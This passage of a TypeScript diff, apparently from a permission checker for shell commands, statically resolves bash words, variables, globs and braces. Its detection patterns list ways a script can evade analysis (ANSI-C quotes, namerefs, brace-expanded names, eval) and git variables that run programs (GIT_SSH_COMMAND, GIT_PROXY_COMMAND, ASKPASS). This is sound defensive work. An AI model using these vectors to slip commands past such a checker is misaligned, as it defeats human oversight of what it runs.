+  /** Known variables and `~` filled in, quotes removed, and each other expansion an EXPANSION_MARK. */
+  text: string;
+  /** Per character of `text`: an unquoted `*`, `?` or `[`. */
+  glob: readonly boolean[];
+  /** Per character of `text`: neither quoted nor escaped. Absent when every character is as written. */
+  active?: readonly boolean[];
+  /** Where the first expansion the scan cannot fill in sits, or null. */
+  expandAt: number | null;
+}
+
+/** What `~`, `$HOME`, `$PWD` and `$OLDPWD` stand for where the word is read. */
+interface WordScope {
+  home: string;
+  cwd: string;
+  previous: string;
+  /** A directory change may or may not have happened, so `cwd` and `previous` are guesses and a relative word is unread. */
+  lost: boolean;
+  /** The script may assign HOME, PWD, OLDPWD or CDPATH, so `~`, `~+`, `~-` and those variables are unread. */
+  rebound: boolean;
+  /** The login name, the one `~name` the scan fills in. */
+  user: string;
+  /** `for` variables bound to the static words they loop over. */
+  bindings: ReadonlyMap<string, LoopBinding>;
+  /** What `$(git rev-parse --show-toplevel)` prints here, or null when the scan cannot tell. */
+  toplevel: string | null;
+  /** Variables a plain top-level `NAME=literal` set earlier in the script, which bash expands to that text. */
+  assigned?: ReadonlyMap<string, string>;
+  homeUsed(): void;
+}
+
+/** `$NAME` or `${NAME}` alone, the one expansion form `WordScope.assigned` fills in. */
+const ASSIGNED_VARIABLE = /^\$(?:\{([A-Za-z_]\w*)\}|([A-Za-z_]\w*))$/;
+
+/** A value word bash leaves as written: no quotes, expansion, glob, space or tilde, and no leading `-` an option parse would read. */
+const LITERAL_VALUE = /^(?!-)[\w./+@-]+$/;
+
+/**
+ * Names a binding must not model: those whose value changes how bash expands words or folders, and those bash keeps
+ * itself, where an assignment is ignored, refused or overwritten (`$BASH_COMMAND` is the running command's text).
+ */
+const UNBOUND_NAMES =
+  /^(HOME|PWD|OLDPWD|CDPATH|IFS|BASH\w*|DIRSTACK|FUNCNAME|GROUPS|UID|EUID|PPID|SHELLOPTS|LINENO|SECONDS|S?RANDOM|EPOCH\w+|HISTCMD|COMP_\w+)$/;
+
+/** Script text that may unset, rebind or reinterpret a variable the walk cannot see: `unset`, `eval`, sourcing, IFS. */
+const MAY_UNBIND = /(^|[^\w-])(unset|eval|source|trap|alias|IFS)\b|(^|[\s;&|(])\.\s/;
+
+/** The one command substitution the scan fills in, as `cd "$(git rev-parse --show-toplevel)"` is common. */
+const TOPLEVEL = /^\$\(\s*git\s+rev-parse\s+--show-toplevel\s*\)$/;
+
+/** A script that names HOME, PWD, OLDPWD or CDPATH other than to expand it may assign it (`=`, read, printf -v, for, export). */
+const REBINDS_HOME = /(^|[^$\w{])(HOME|PWD|OLDPWD|CDPATH)\b/;
+
+/** A longer script is not read at all. */
+const MAX_SCRIPT = 16384;
+
+/** How long a scan may take before the script counts as unread; a WSL folder answers through the VM. */
+const SCAN_DEADLINE_MS = 5000;
+const WSL_SCAN_DEADLINE_MS = 15000;
+
+/** Builtins whose words name the variables they assign. */
+const NAMES_VARIABLES = /^(export|declare|typeset|local|readonly|read|readarray|mapfile|getopts|let)$/;
+
+/** Of NAMES_VARIABLES, those that set a value bash decides as it runs. */
+const SETS_AT_RUNTIME = /^(read|readarray|mapfile|getopts|let)$/;
+
+/** An assignment whose name holds a brace expansion, `C{D,}PATH=`; each part of the pattern matches in one pass. */
+const BRACED_NAME = /^[A-Za-z_]\w*\{([^{}=]*)\}[\w{},.]*\+?=/;
+const BRACED_ASSIGNMENT = { test: (word: string): boolean => /,|\.\./.test(BRACED_NAME.exec(word)?.[1] ?? '') };
+
+/**
+ * Whether the script parsed as `root` holds an ANSI-C quote (`$'...'`), so `grep 'ts$'` holds none; any `$'`
+ * counts when the parse has an error.
+ */
+function ansiCQuoted(root: Node, command: string): boolean {
+  if (root.hasError) return command.includes("$'");
+  return root.descendantsOfType('ansi_c_string').length > 0;
+}
+
+/**
+ * Whether the script can assign a variable whose name the text does not spell out: an ANSI-C quote, the
+ * alias and command hash tables, a nameref, or a computed or brace-expanded name given to a builtin that
+ * assigns by name. `text` has its quotes and backslashes removed.
+ */
+function rebindsAnyName(root: Node, command: string, text: string, { set, splitsString }: ScriptVariables): boolean {
+  if (ansiCQuoted(root, command) || /BASH_ALIASES|BASH_CMDS/.test(text)) return true;
+  for (const segment of text.split(/[;&|\n()]/)) {
+    if (
+      segment
+        .trim()
+        .split(/\s+/)
+        .some(word => BRACED_ASSIGNMENT.test(word))
+    )
+      return true;
+  }
+  // env -S reads its assignments from a string the parse holds as one word.
+  return splitsString || set.some(({ name, nameref }) => nameref || /[$`{}!]/.test(name));
+}
+
+/**
+ * Where bash reads text as arithmetic (`let`, `declare -i`, `[[ x -eq y ]]`, `(( ))`, an array subscript), and runs
+ * a `$(...)` in a subscript of it even when quoting kept the shell from expanding it.
+ */
+const ARITHMETIC =
+  /\(\(|\$\[|\blet\b|\[\[[^\]]*\s-(eq|ne|lt|le|gt|ge)\b|\b(declare|typeset|local)\s+([-+][A-Za-z]*\s+)*?[-+][A-Za-z]*i|[A-Za-z_]\w*\[/;
+
+/** A subscript holding a command substitution, in text with its quotes and backslashes removed. */
+const SUBSCRIPT_SUBSTITUTION = /\w\[[^\]]*(\$\(|`)/;
+
+/**
+ * Whether the parser split one bash word after a `$` it could not read, as it does `./{$x,y}a.claude` into `./{$`
+ * and `x,y}a.claude`: the `$` ends a word that the next one follows with no space between.
+ */
+function splitAtDollar(root: Node): boolean {
+  return root.descendantsOfType('$').some(dollar => {
+    const parent = dollar?.parent;
+    if (!dollar || !parent) return false;
+    let word: Node;
+    if (parent.type === 'concatenation' && parent.lastChild?.id === dollar.id) word = parent;
+    else if (['command', 'for_statement', 'declaration_command', 'unset_command'].includes(parent.type)) word = dollar;
+    else return false;
+    const next = word.nextSibling;
+    if (next === null || next.startIndex !== word.endIndex || next.type.endsWith('redirect')) return false;
+    // A lone `$` before a string is bash's `$"..."` translated string, one word as parsed.
+    return !(word.id === dollar.id && next.type === 'string');
+  });
+}
+
+/** Whether the script holds a command substitution quoting left as text: single-quoted or escaped. */
+function quotedSubstitution(root: Node, command: string): boolean {
+  if (/\\\$\(|\\`/.test(command)) return true;
+  return root.descendantsOfType('raw_string').some(node => /\$\(|`/.test(node?.text ?? ''));
+}
+
+/**
+ * Words bash reads as syntax where a command starts. The parser has no `time` keyword, so it reads `time for ...`,
+ * `! for ...` or `time { ...; }` as commands named by these words, and what runs inside them is not what bash runs.
+ */
+const RESERVED_WORDS = new Set([
+  '!',
+  '[[',
+  ']]',
+  '((',
+  '{',
+  '}',
+  'case',
+  'do',
+  'done',
+  'elif',
+  'else',
+  'esac',
+  'fi',
+  'for',
+  'function',
+  'if',
+  'in',
+  'select',
+  'then',
+  'until',
+  'while',
+]);
+
+/** A variable a script sets. */
+export interface VariableSet {
+  /** As written once unquoted, so a computed name still holds its `$`. */
+  name: string;
+  /** Undefined when the script gives none (`export NAME`), null when bash decides it as it runs (`read NAME`). */
+  value: string | null | undefined;
+  /** Declared a nameref, so assigning it sets whichever variable it is bound to. */
+  nameref: boolean;
+  startIndex: number;
+  uncertainOrder: boolean;
+  /** Set with `+=`, so `value` follows whatever the variable held. */
+  appends?: boolean;
+  /** The start of the one command a prefix assignment (`NAME=x cmd`, `env NAME=x cmd`) applies to. */
+  prefixOf?: number;
+}
+
+/**
+ * Each variable the script parsed as `root` sets, wherever it runs: assignments, wrapper and builtin operands, `printf
+ * -v`, loop variables, `${NAME:=value}`, nameref targets; and whether an `env -S` splits one word into more.
+ */
+export interface ScriptVariables {
+  set: VariableSet[];
+  splitsString: boolean;
+}
+
+/**
+ * `root.descendantsOfType(types)`, in the same order, each with whether an ancestor branches or repeats. One cursor
+ * walk, since `node.parent` costs the node's depth and a deeply nested script would make a parent chain quadratic.
+ */
+function descendantsUnderBranch(root: Node, types: ReadonlySet<string>): { node: Node; underBranch: boolean }[] {
+  let above = false;
+  for (let parent = root.parent; parent !== null; parent = parent.parent) {
+    if (BRANCHES.has(parent.type) || REPEATS.has(parent.type)) above = true;
+  }
+  const found: { node: Node; underBranch: boolean }[] = [];
+  const within = [above];
+  const cursor = root.walk();
+  try {
+    for (;;) {
+      const type = cursor.nodeType;
+      const underBranch = within[within.length - 1] as boolean;
+      if (types.has(type)) found.push({ node: cursor.currentNode, underBranch });
+      if (cursor.gotoFirstChild()) {
+        within.push(underBranch || BRANCHES.has(type) || REPEATS.has(type));
+        continue;
+      }
+      while (!cursor.gotoNextSibling()) {
+        if (within.length === 1 || !cursor.gotoParent()) return found;
+        within.pop();
+      }
+    }
+  } finally {
+    cursor.delete();
+  }
+}
+
+export function scriptVariables(root: Node): ScriptVariables {
+  const set: VariableSet[] = [];
+  let splits = false;
+  let startIndex = 0;
+  let uncertainOrder = false;
+  let prefixOf: number | undefined;
+  const add = (name: string, value: string | null | undefined, nameref = false, appends = false): void => {
+    set.push({
+      name: name.trim(),
+      value,
+      nameref,
+      startIndex,
+      uncertainOrder,
+      ...(appends ? { appends } : {}),
+      ...(prefixOf !== undefined ? { prefixOf } : {}),
+    });
+  };
+  const named = (word: string, value: null | undefined, nameref = false): void => {
+    const equals = word.indexOf('=');
+    const name = equals === -1 ? word : word.slice(0, equals).replace(/\+$/, '');
+    add(name, value === null || equals === -1 ? value : word.slice(equals + 1), nameref, word[equals - 1] === '+');
+    if (nameref && equals !== -1) add(word.slice(equals + 1), null);
+  };
+  const types = new Set(['variable_assignment', 'expansion', 'for_statement', 'declaration_command', 'command']);
+  for (const { node, underBranch } of descendantsUnderBranch(root, types)) {
+    startIndex = node.startIndex;
+    uncertainOrder = underBranch;
+    prefixOf = undefined;
+    if (node.type === 'variable_assignment') {
+      if (node.parent?.type === 'command') prefixOf = node.parent.startIndex;
+      const name = node.childForFieldName('name');
+      const base = name?.type === 'subscript' ? name.childForFieldName('name') : name;
+      const appends = node.children.some(child => child?.type === '+=');
+      add(base?.text ?? '', wordValue(node.childForFieldName('value')?.text ?? ''), false, appends);
+      continue;
+    }
+    if (node.type === 'expansion') {
+      const assigning = /^\$\{(!?\w+(?:\[[^\]]*\])?):?=([^]*)\}$/.exec(node.text);
+      if (assigning) add(assigning[1] ?? '', wordValue(assigning[2] ?? ''));
+      continue;
+    }
+    if (node.type === 'for_statement') {
+      add(node.childForFieldName('variable')?.text ?? '', null);
+      continue;
+    }
+    const list = (node.type === 'command' ? words(node) : declarationWords(node)).map(wordValue);
+    let at = 0;
+    for (let word = list[0]; word !== undefined; word = list[at]) {
+      if (word === 'builtin') {
+        at++;
+        continue;
+      }
+      if (!isWrapper(word)) break;
+      const end = pastWrapper(list, at);
+      if (WRAPPERS.get(programName(word))?.assignments) {
+        for (let index = at + 1; index < end; index++) {
+          const arg = list[index] as string;
+          if (/^[A-Za-z_]\w*\+?=/.test(arg)) {
+            prefixOf = node.startIndex;
+            named(arg, undefined);
+            prefixOf = undefined;
+          }
+        }
+      }
+      at = end;
+    }
+    splits ||= splitString(list) !== null;
+    const program = list[at] ?? '';
+    const args = list.slice(at + 1);
+    if (program === 'printf') {
+      const option = args.findIndex(value => /^-[A-Za-z]*v/.test(value));
+      const given = args[option];
+      if (given === '-v') named(args[option + 1] ?? '', null);
+      else if (given !== undefined) named(given.slice(2), null);
+      continue;
+    }
+    if (!NAMES_VARIABLES.test(program)) continue;
+    const runtime = SETS_AT_RUNTIME.test(program);
+    const nameref = /^(declare|typeset|local)$/.test(program) && args.some(value => /^-[A-Za-z]*n/.test(value));
+    // getopts sets only its second word; its first is the option letters.
+    const operands = program === 'getopts' ? args.slice(1, 2) : args.filter(value => !/^[-+]/.test(value));
+    // A declaration's own assignment children (`export HOME=x`) were added above.
+    const assigned =
+      node.type === 'declaration_command' && !nameref && !runtime
+        ? new Set(
+            node.namedChildren.flatMap(child =>
+              child?.type === 'variable_assignment' ? [child.childForFieldName('name')?.text ?? ''] : []
+            )
+          )
+        : new Set<string>();
+    for (const value of operands) {
+      if (/^[A-Za-z_]\w*\+?=/.test(value) && assigned.has(value.slice(0, value.indexOf('=')).replace(/\+$/, ''))) {
+        continue;
+      }
+      named(value, runtime ? null : undefined, nameref);
+    }
+  }
+  return { set, splitsString: splits };
+}
+
+/** The words of a declaration command as written, with parts the parse splits but bash reads as one word rejoined. */
+function declarationWords(node: Node): string[] {
+  const out = [node.child(0)?.text ?? ''];
+  let end = -1;
+  for (const child of node.namedChildren) {
+    if (!child || child.type === 'comment') continue;
+    if (child.startIndex === end && out.length > 1) out[out.length - 1] += child.text;
+    else out.push(child.text);
+    end = child.endIndex;
+  }
+  return out;
+}
+
+/**
+ * Variables through which git is handed a program to run, config naming one, or a file or folder to write its index
+ * or objects to; git falls back to SSH_ASKPASS for a password and to the last three for an editor and pager.
+ */
+const GIT_PROGRAM_VARIABLE =
+  /^(GIT_(EXEC_PATH|CONFIG\w*|EDITOR|SEQUENCE_EDITOR|PAGER|SSH|SSH_COMMAND|ASKPASS|EXTERNAL_DIFF|DIFFTOOL_EXTCMD|PROXY_COMMAND|TEMPLATE_DIR|ALLOW_PROTOCOL|INDEX_FILE|OBJECT_DIRECTORY)|SSH_ASKPASS|EDITOR|VISUAL|PAGER)$/;
+
+/** A GIT_TRACE* value that has git write to a file or socket: an absolute path, `af_unix:`, or one bash fills in. */
+const TRACE_TARGET = /^([/\\~]|[A-Za-z]:|af_unix:)|[$`]/i;
+
+/** Pager and editor values that run nothing: git prints straight out for `cat` or an empty pager. */
+const PAGER_VARIABLE = /^(GIT_PAGER|PAGER)$/;
+const EDITOR_VARIABLE = /^(GIT_EDITOR|GIT_SEQUENCE_EDITOR|EDITOR|VISUAL)$/;
+const IDLE_PAGER = new Set(['', 'cat']);
+const IDLE_EDITOR = new Set([':', 'true']);
+
+/**
+ * Script text through which git's output may reach a terminal, the only place it starts its pager (Desktop hands it a
+ * pipe): a terminal device, a /dev path bash fills in, another process's descriptors, or a program that runs a
+ * command in a pseudo-terminal.
+ */
+const TERMINAL_OUTPUT =
+  /\/dev\/[^\s;&|<>()]*[$`{*?[]|\/proc\/|\b(tty|pts|pty|ptmx|console|cons\d+|mknod|unbuffer|script|expect|tmux|screen|socat|faketty|winpty|conpty|openpty|forkpty)\b/i;
+
+/**
+ * Whether a redirect points stdout anywhere but `/dev/null`: a file or device, which may be a terminal, or another
+ * descriptor, which may be one.
+ */
+function redirectsStdout(redirect: Node): boolean {
+  if (redirect.type !== 'file_redirect') return false;
+  const operator = redirectOperator(redirect) ?? '';
+  const descriptor = redirect.children.find(child => child?.type === 'file_descriptor')?.text;
+  if (descriptor === undefined ? !operator.includes('>') : descriptor !== '1') return false;
+  const targets = redirect.childrenForFieldName('destination');
+  const target = targets.length === 1 ? targets[0] : null;
+  const quotable = target && ['word', 'string', 'raw_string'].includes(target.type);
+  return (quotable ? fixedWords([target.text])?.[0] : undefined) !== '/dev/null';
+}
+
+/** A difftool or mergetool name git reads as a path into its own tool scripts, or one bash fills in. */
+const TOOL_PATH = /[/\\$`]/;
+
+/** Whether a script setting `set` sets a variable git reads a program to run or a file to write from. */
+function setsGitVariable(set: readonly VariableSet[]): boolean {
+  return set.some(({ name, value }) => {
+    // An element of an exported scalar (`NAME[0]=`) is its value.
+    const base = name.replace(/\[[^]*$/, '');
+    if (typeof value === 'string') {
+      if (variableNames(PAGER_VARIABLE).test(base) && IDLE_PAGER.has(value)) return false;
+      if (variableNames(EDITOR_VARIABLE).test(base) && IDLE_EDITOR.has(value)) return false;
+    }
+    if (variableNames(GIT_PROGRAM_VARIABLE).test(base)) return true;
+    if (variableNames(/^GIT_(DIFF|MERGE)_TOOL$/).test(base)) return value === null || TOOL_PATH.test(value ?? '');
+    const writes = value === null || (value !== undefined && TRACE_TARGET.test(value));
+    return writes && variableNames(/^GIT_TRACE\w*$/).test(base);
+  });
+}
+
+const GIT_FALLBACK_READS = new Set([
+  'status',
+  'log',
+  'show',
+  'diff',
+  'blame',
+  'rev-parse',
+  'rev-list',
+  'ls-files',
+  'ls-tree',
+  'ls-remote',
+  'show-ref',
+  'describe',
+  'name-rev',
+  'cat-file',
+  'for-each-ref',
+  'diff-files',
+  'diff-index',
+  'diff-tree',
+]);
+
+/** Whether a shell word holds a glob bash expands. */
+const hasActiveGlob = (word: string): boolean =>
+  wordPieces(word).some(piece => 'char' in piece && piece.active && '*?['.includes(piece.char));
+
+/** Unknown commands stay conservative; ordinary piped output does not start Git's terminal pager. */
+function usesGitFallback(name: string, tokens: readonly string[], cwd: string): boolean {
+  const written = withoutWrappers(tokens).slice(1);
+  const raw = written.map(wordValue);
+  const git = gitSubcommand(raw, cwd);
+  if (git === null) return false;
+  if (git.unread || git.rest.some(isDynamic) || written.some(hasActiveGlob)) return true;
+  if (GIT_FALLBACK_READS.has(git.sub)) return false;
+  if (name === 'PAGER') {
+    if (git.sub === 'grep') return gitRunsGivenCommand(raw);
+    return !['commit', 'tag', 'branch', 'config', 'add', 'merge', 'rebase', 'revert', 'cherry-pick', 'notes'].includes(
+      git.sub
+    );
+  }
+  // A word counts as an option only where the table reads one: not after `--`, nor as another option's value.
+  const listing = gitListed(raw.map(text => ({ text, whole: true, splits: false })));
+  if (!listing.listed) return true;
+  const given = [...listing.given.keys()];
+  const args = git.rest;
+  const edits =
+    args.some(arg => arg === '-e' || arg.startsWith('--edit')) ||
+    given.some(option => option === '-e' || option.startsWith('--edit'));
+  if (git.sub === 'commit' || git.sub === 'tag') {
+    if (edits) return true;
+    const message =
+      (args.includes('--no-edit') || args.some(arg => /^(-[mF]|--message(?:=|$)|--file(?:=|$))/.test(arg))) &&
+      given.some(option => ['--no-edit', '-m', '--message', '-F', '--file'].includes(option));
+    if (message) return false;
+    if (git.sub === 'tag') {
+      return (
+        args.some(arg => /^(-[asu]|--annotate|--sign|--local-user)/.test(arg)) ||
+        given.some(option => ['-a', '-s', '-u', '--annotate', '--sign', '--local-user'].includes(option))
+      );
+    }
+    return true;
+  }
+  if (['branch', 'config', 'add'].includes(git.sub)) return edits || (git.sub === 'config' && args[0] === 'edit');
+  if (git.sub === 'grep') return false;
+  return true;
+}
+
+/** Whether git opens its pager whatever its output is: `grep -O`, or a call whose subcommand the scan cannot read. */
+function opensPager(tokens: readonly string[], cwd: string): boolean {
+  const raw = withoutWrappers(tokens).slice(1);
+  const git = gitSubcommand(raw.map(wordValue), cwd);
+  if (git === null) return false;
+  return git.unread || (git.sub === 'grep' && gitRunsGivenCommand(raw));
+}
+
+function loginName(): string {
+  try {
+    return userInfo().username;
+  } catch {
+    return '';
+  }
+}
+
+/** A double-quoted word that is one variable with fixed text around it: `"$f"`, `"src/${f}.bak"`. */
+const BOUND_WORD = /^"([^"$`\\']*)\$(?:\{([A-Za-z_]\w*)\}|([A-Za-z_]\w*))([^"$`\\']*)"$/;
+
+/**
+ * An unquoted word that is one variable with plain text around it: `sub/$f`, `jobs/${id}/logs`. An unbraced name
+ * must end where the word or a non-word character does, as bash reads `$fx` as the variable `fx`.
+ */
+const UNQUOTED_BOUND_WORD = /^([\w./+@:%=-]*)\$(?:\{([A-Za-z_]\w*)\}|([A-Za-z_]\w*)(?!\w))([\w./+@:%=-]*)$/;
+
+/**
+ * A loop value bash passes unchanged through word splitting and globbing: no quote, space, glob or expansion, and
+ * no leading `-` a program would read as an option.
+ */
+const PLAIN_LOOP_VALUE = /^(?!-)[\w./+@:%=-]+$/;
+
+/**
+ * The words a `for` variable takes. `unquoted` is false when the script may set IFS, which can split an unquoted
+ * use where the scan does not; a double-quoted use is never split, so it binds either way.
+ */
+interface LoopBinding {
+  values: readonly string[];
+  unquoted: boolean;
+}
+
+/** The words a bound `for` variable stands for in `raw`, with the fixed text around it; null when `raw` is not one. */
+function boundWords(raw: string, bindings: ReadonlyMap<string, LoopBinding>): string[] | null {
+  if (bindings.size === 0) return null;
+  const match = BOUND_WORD.exec(raw);
+  const values = match ? bindings.get(match[2] ?? match[3] ?? '')?.values : undefined;
+  if (match && values) {
+    const quoted = (text: string): string => (text ? `'${text}'` : '');
+    return values.map(value => `${quoted(match[1] ?? '')}${value}${quoted(match[4] ?? '')}`);
+  }
+  // Unquoted, bash splits and globs what the variable gives, so only values that come through both unchanged bind.
+  const plain = UNQUOTED_BOUND_WORD.exec(raw);
+  const binding = plain ? bindings.get(plain[2] ?? plain[3] ?? '') : undefined;
+  const plainValues = binding?.unquoted ? binding.values : undefined;
+  if (!plain || !plainValues || !plainValues.every(value => PLAIN_LOOP_VALUE.test(value))) return null;
+  return plainValues.map(value => `${plain[1] ?? ''}${value}${plain[4] ?? ''}`);
+}
+
+/** A POSIX, drive or UNC absolute path, which does not depend on the folder a command runs in. */
+const isAbsolutePath = (text: string): boolean => /^(\/|[A-Za-z]:[\\/]|\\\\)/.test(text);
+
+/** Absolute for git in `cwd`: a drive or UNC path only in a native Windows shell; a POSIX shell, WSL included, reads it as relative. */
+export const isAbsoluteGitPath = (text: string, cwd: string): boolean =>
+  text.startsWith('/') || (process.platform === 'win32' && wslLocation(cwd) === null && isAbsolutePath(text));
+
+const KNOWN_VARIABLE = /^\$(?:\{(HOME|PWD|OLDPWD)\}|(HOME|PWD|OLDPWD))$/;
+
+function resolveWord(pieces: readonly WordPiece[], scope: WordScope): OperandWord {
+  let text = '';
+  const glob: boolean[] = [];
+  const active: boolean[] = [];
+  let expandAt: number | null = null;
+  const literal = (value: string): void => {
+    text += value;
+    for (let index = 0; index < value.length; index++) {
+      glob.push(false);
+      active.push(false);
+    }
+  };
+  const unknown = (): void => {
+    expandAt ??= text.length;
+    literal(EXPANSION_MARK);
+  };
+  let from = 0;
+  if (isActive(pieces[0], '~')) {
+    let name = '';
+    let end = 1;
+    for (; end < pieces.length && !isActive(pieces[end], '/'); end++) {
+      const piece = pieces[end];
+      if (!piece || !('char' in piece) || !piece.active) break;
+      name += piece.char;
+    }
+    if (end === pieces.length || isActive(pieces[end], '/')) {
+      from = end;
+      // Another user's home comes from the password database, which the scan does not read.
+      const own = name === '' || (name === scope.user && scope.user !== '');
+      if (own) scope.homeUsed();
+      if (scope.rebound) unknown();
+      else if (own) literal(scope.home);
+      else if (name === '+' && !scope.lost) literal(scope.cwd);
+      else if (name === '-' && !scope.lost) literal(scope.previous);
+      else unknown();
+    }
+  }
+  for (const piece of pieces.slice(from)) {
+    if ('char' in piece) {
+      if (piece.char === '') continue;
+      text += piece.char;
+      glob.push(piece.active && '*?['.includes(piece.char));
+      active.push(piece.active);
+      continue;
+    }
+    const named = ASSIGNED_VARIABLE.exec(piece.expansion);
+    const assignedValue = named ? scope.assigned?.get(named[1] ?? named[2] ?? '') : undefined;
+    if (assignedValue !== undefined) {
+      literal(assignedValue);
+      continue;
+    }
+    const known = KNOWN_VARIABLE.exec(piece.expansion);
+    const variable = scope.rebound ? undefined : (known?.[1] ?? known?.[2]);
+    if (variable === 'HOME') {
+      scope.homeUsed();
+      literal(scope.home);
+    } else if (variable === 'PWD' && !scope.lost) {
+      literal(scope.cwd);
+    } else if (variable === 'OLDPWD' && !scope.lost) {
+      literal(scope.previous);
+    } else if (scope.toplevel !== null && TOPLEVEL.test(piece.expansion)) {
+      literal(scope.toplevel);
+    } else {
+      unknown();
+    }
+  }
+  if (scope.lost && text !== '' && expandAt === null && !isAbsolutePath(text)) expandAt = 0;
+  return { text, glob, active, expandAt };
+}
+
+/** Every word one shell word becomes after brace expansion; null when expandBraces cannot read its braces. */
+function operandWords(raw: string, scope: WordScope): OperandWord[] | null {
+  const bound = boundWords(raw, scope.bindings);
+  if (bound) {
+    const each = bound.map(word => operandWords(word, { ...scope, bindings: new Map() }));
+    return each.some(words => words === null) ? null : each.flatMap(words => words ?? []);
+  }
+  return expandBraces(wordPieces(raw))?.map(pieces => resolveWord(pieces, scope)) ?? null;
+}
+
+const OPEN_GIT_WORD: GitWord = { text: '', whole: false, splits: true };
+// `"$@"`, `"${a[@]}"` and the like expand to several words even inside double quotes.
+const QUOTED_SPLIT = /^\$\{?[@*]|\[[@*]\]/;
+
+type GitFill = { placeholder: string; prefix: string };
+
+/**
+ * One shell word as the words gitTable reads, one per brace variant. A word holding `fill.placeholder` (an xargs or
+ * find replace string) stands for input starting with `fill.prefix`.
+ */
+function gitWords(raw: string, scope: WordScope, fill?: GitFill): GitWord[] {
+  if (fill !== undefined) {
+    const value = wordValue(raw);
+    const at = value.indexOf(fill.placeholder);
+    if (at !== -1) {
+      const before = isDynamic(raw) || /[*?[{~]/.test(value.slice(0, at)) ? '' : value.slice(0, at);
+      return [{ text: before || fill.prefix, whole: false, splits: false }];
+    }
+  }
+  const variants = expandBraces(wordPieces(raw));
+  if (variants === null) return [OPEN_GIT_WORD];
+  const plain: WordScope = { ...scope, lost: false, homeUsed: () => undefined };
+  return variants.map(pieces => {
+    const { text, glob, expandAt } = resolveWord(pieces, plain);
+    const globAt = glob.indexOf(true);
+    if (expandAt === null && globAt === -1) return { text, whole: true, splits: false };
+    const end = Math.min(expandAt ?? text.length, globAt === -1 ? text.length : globAt);
+    const splits = pieces.some(
+      piece => 'expansion' in piece && (piece.unquoted === true || QUOTED_SPLIT.test(piece.expansion))
+    );
+    return { text: text.slice(0, end), whole: false, splits, ...(globAt === -1 ? {} : { glob: true }) };
+  });
+}
+
+/** The calls git gets from `args`: one per combination of the values each `for` variable among them takes. */
+function gitCalls(args: readonly string[], scope: WordScope, fill?: GitFill): GitWord[][] {
+  let calls: GitWord[][] = [[]];
+  for (const raw of args) {
+    const bound = boundWords(raw, scope.bindings);
+    const choices = bound ? bound.map(word => gitWords(word, scope, fill)) : [gitWords(raw, scope, fill)];
+    calls =
+      calls.length * choices.length > 16
+        ? calls.map(call => [...call, OPEN_GIT_WORD])
+        : calls.flatMap(call => choices.map(choice => [...call, ...choice]));
+  }
+  return calls;
+}
+
+/** The one plain start point a find names before its expression, which each `{}` it fills starts with; else ''. */
+function findStart(args: readonly string[]): string {
+  const [first, second] = args;
+  if (first === undefined || /[$`*?[{~\\'"]/.test(first) || /^[-(!,]/.test(first)) return '';
+  return second === undefined || /^[-(!,]/.test(wordValue(second)) ? first : '';
+}
+
+/** A word already as the program sees it, as a Windows program's operand is: no quotes, and no expansion left. */
+function literalWord(text: string): OperandWord {
+  const expandAt = text.search(/[$`]/);
+  return { text, glob: [...text].map(char => '*?['.includes(char)), expandAt: expandAt === -1 ? null : expandAt };
+}
+
+/** A path read exactly as written: no glob and no expansion. */
+const exactWord = (text: string): OperandWord => ({ text, glob: [...text].map(() => false), expandAt: null });
+
+interface ReadOperand {
+  /** The path the operand names, or for a glob or an expansion the folder it expands under. */
+  path: string;
+  /** Where the glob or expansion starts, or null when `path` is the whole operand. */
+  start: number | null;
+  /** A variable or command substitution decides the operand. */
+  unread: boolean;
+}
+
+function readOperand(word: OperandWord, dirnameOf: (path: string) => string): ReadOperand {
+  const globAt = word.glob.indexOf(true);
+  const starts = [globAt === -1 ? null : globAt, word.expandAt].filter((at): at is number => at !== null);
+  if (starts.length === 0) return { path: word.text, start: null, unread: false };
+  const start = Math.min(...starts);
+  // As compileRule does: a partial name is a match inside its folder, and `x/` names `x` itself.
+  return { path: dirnameOf(`${word.text.slice(0, start)}x`), start, unread: word.expandAt !== null };
+}
+
+/** One character of a glob component; `active` is false where quoting or a backslash made it literal. */
+type GlobChar = { char: string; glob: boolean; active: boolean };
+
+type GlobToken = { kind: 'star' } | { kind: 'one'; matches: (char: string) => boolean };
+
+/** Splits a component into tokens, reading a bracket class as bash does; an unclosed `[` is literal. */
+function globTokens(pattern: readonly GlobChar[]): GlobToken[] {
+  const tokens: GlobToken[] = [];
+  const special = (piece: GlobChar | undefined, char: string): boolean => piece?.active === true && piece.char === char;
+  for (let at = 0; at < pattern.length; at++) {
+    const { char, glob } = pattern[at] as GlobChar;
+    if (glob && char === '*') {
+      if (tokens[tokens.length - 1]?.kind !== 'star') tokens.push({ kind: 'star' });
+      continue;
+    }
+    if (glob && char === '?') {
+      tokens.push({ kind: 'one', matches: () => true });
+      continue;
+    }
+    let close = -1;
+    let body = at + 1;
+    const negated = glob && char === '[' && (special(pattern[body], '!') || special(pattern[body], '^'));
+    if (negated) body++;
+    if (glob && char === '[') {
+      // A leading `]` is a member; POSIX classes, collating symbols and equivalence classes contain their own `]`.
+      for (let index = body; index < pattern.length; index++) {
+        const marker = pattern[index + 1]?.char;
+        if (special(pattern[index], '[') && marker !== undefined && [':', '.', '='].includes(marker)) {
+          const end = pattern.findIndex(
+            (piece, at) => at > index + 1 && special(piece, marker) && special(pattern[at + 1], ']')
+          );
+          if (end !== -1) index = end + 1;
+        } else if (index > body && special(pattern[index], ']')) {
+          close = index;
+          break;
+        }
+      }
+    }
+    if (close === -1) {
+      const literal = char.toLowerCase();
+      tokens.push({ kind: 'one', matches: candidate => candidate.toLowerCase() === literal });
+      continue;
+    }
+    const members = pattern.slice(body, close);
+    // Locale-dependent classes may match anything even when negated; collating symbols can span characters.
+    const complex = members.some(
+      (piece, index) => special(piece, '[') && [':', '.', '='].includes(members[index + 1]?.char ?? '')
+    );
+    if (complex) {
+      tokens.push({ kind: 'star' });
+      at = close;
+      continue;
+    }
+    const tests: ((char: string) => boolean)[] = [];
+    for (let index = 0; index < members.length; index++) {
+      const low = (members[index] as GlobChar).char;
+      const high = members[index + 2];
+      if (special(members[index + 1], '-') && high !== undefined) {
+        tests.push(candidate => candidate >= low && candidate <= high.char);
+        index += 2;
+      } else {
+        tests.push(candidate => candidate === low);
+      }
+    }
+    const inClass = (candidate: string): boolean => tests.some(test => test(candidate));
+    // Case is ignored, which only asks more: either case of the name's character may satisfy the class.
+    const matches = (candidate: string): boolean =>
+      [candidate, candidate.toLowerCase(), candidate.toUpperCase()].some(form => inClass(form) !== negated);
+    tokens.push({ kind: 'one', matches });
+    at = close;
+  }
+  return tokens;
+}
+
+/**
+ * Whether one glob component can match `name`, by bash's rules: a leading dot is matched only by a
